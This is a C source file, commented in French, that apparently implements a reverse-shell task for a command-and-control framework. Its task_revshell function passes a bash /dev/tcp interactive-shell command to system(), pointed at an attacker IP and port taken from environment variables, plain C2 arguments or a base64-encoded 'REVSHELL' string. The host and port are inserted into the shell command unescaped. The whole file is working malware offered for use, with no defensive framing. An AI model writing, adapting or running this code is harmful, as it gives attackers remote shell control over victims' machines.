#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "base64.h" // Pour les fonctions de décodage base64

// Définition des valeurs par défaut si non fournies à la compilation
#ifndef DEFAULT_UID
#define DEFAULT_UID "66bce8e71f"
#endif

#ifndef DEFAULT_IP
#define DEFAULT_IP "127.0.0.1"
#endif

#ifndef DEFAULT_PORT
#define DEFAULT_PORT "8081"
#endif

// Fonction pour obtenir une valeur depuis une variable d'environnement ou utiliser une valeur par défaut
char* get_env_value(const char* env_name, const char* default_value) {
    // Vérifier les variables d'environnement
    char* value = getenv(env_name);
    if (value != NULL && strlen(value) > 0) {
        return strdup(value);
    }
    
    // Utiliser la valeur par défaut
    return strdup(default_value);
}

int task_revshell(char *cmd[]) {
    char command[1024];
    char *uid = cmd[2];
    char *ip_attaquant = cmd[3];
    char *port_attaquant = cmd[4];

    // Créer la commande pour le reverse shell
    snprintf(command, sizeof(command), "bash -c 'sh -i >& /dev/tcp/%s/%s 0>&1'", ip_attaquant, port_attaquant);

    // Exécuter la commande
    printf("Lancement du reverse shell vers %s:%s\n", ip_attaquant, port_attaquant);
    system(command);

    return 0;
}

// Fonction pour diviser une chaîne en tokens selon un délimiteur
char** split_string(char* input, const char* delimiter, int* count) {
    *count = 0;
    char* copy = strdup(input);
    char* token = strtok(copy, delimiter);

    // Compter le nombre de tokens
    while (token) {
        (*count)++;
        token = strtok(NULL, delimiter);
    }

    // Allocation du tableau de résultats
    char** result = (char**)malloc((*count + 1) * sizeof(char*));

    // Refaire le tokenizing pour remplir le tableau
    strcpy(copy, input);
    token = strtok(copy, delimiter);
    int i = 0;

    while (token) {
        result[i] = strdup(token);
        i++;
        token = strtok(NULL, delimiter);
    }

    result[i] = NULL; // Terminer par NULL pour compatibilité avec exec
    free(copy);
    return result;
}

int main(int argc, char *argv[]) {
    // Mode test (sans arguments)
    if (argc == 1) {
        // Obtenir des valeurs modulables
        char *task_name = "task";
        char *task_type = "revshell";
        char *uid = get_env_value("REVSHELL_UID", DEFAULT_UID);
        char *ip = get_env_value("REVSHELL_IP", DEFAULT_IP);
        char *port = get_env_value("REVSHELL_PORT", DEFAULT_PORT);
        
        char *cmd[] = { task_name, task_type, uid, ip, port, NULL };
        int result = task_revshell(cmd);
        
        // Libérer la mémoire allouée
        free(uid);
        free(ip);
        free(port);
        
        return result;
    }
    
    // Mode avec format C2: task revshell UID PORT IP
    if (argc == 6 && strcmp(argv[1], "task") == 0 && strcmp(argv[2], "revshell") == 0) {
        char* cmd[6];
        cmd[0] = argv[1]; // "task"
        cmd[1] = argv[2]; // "revshell"
        cmd[2] = argv[3]; // UID
        cmd[3] = argv[5]; // IP
        cmd[4] = argv[4]; // PORT
        cmd[5] = NULL;
        
        return task_revshell(cmd);
    }

    // Mode avec argument REVSHELL,UID,PORT_BASE64,IP_BASE64
    if (argc == 2) {
        int parts_count;
        char** parts = split_string(argv[1], ",", &parts_count);

        if (parts_count != 4 || strcmp(parts[0], "REVSHELL") != 0) {
            printf("Format invalide. Attendu: REVSHELL,UID,PORT_BASE64,IP_BASE64\n");
            for (int i = 0; i < parts_count; i++) {
                free(parts[i]);
            }
            free(parts);
            return 1;
        } // faut que ca soit les entrées du c2

        // Récupérer les parties
        char* task_type = parts[0];
        char* uid = parts[1];
        char* port_base64 = parts[2];
        char* ip_base64 = parts[3];

        // Décoder le port et l'IP
        char* port = NULL;
        char* ip = NULL;

        decoder_base64(port_base64, &port);
        decoder_base64(ip_base64, &ip);

        // Construire le tableau de commande pour task_revshell
        char* cmd[6];
        cmd[0] = "task";
        cmd[1] = "revshell";
        cmd[2] = uid;
        cmd[3] = ip;
        cmd[4] = port;
        cmd[5] = NULL;

        // Exécuter la tâche
        int result = task_revshell(cmd);

        // Libérer la mémoire
        for (int i = 0; i < parts_count; i++) {
            free(parts[i]);
        }
        free(parts);
        free(port);
        free(ip);

        return result;
    }

    // Mauvais nombre d'arguments
    printf("Usage: %s [REVSHELL,UID,PORT_BASE64,IP_BASE64]\n", argv[0]);
    printf("   OU: %s task revshell UID PORT IP\n", argv[0]);
    printf("   OU: sans argument (utilise les variables d'environnement ou valeurs par défaut)\n");
    return 1;
}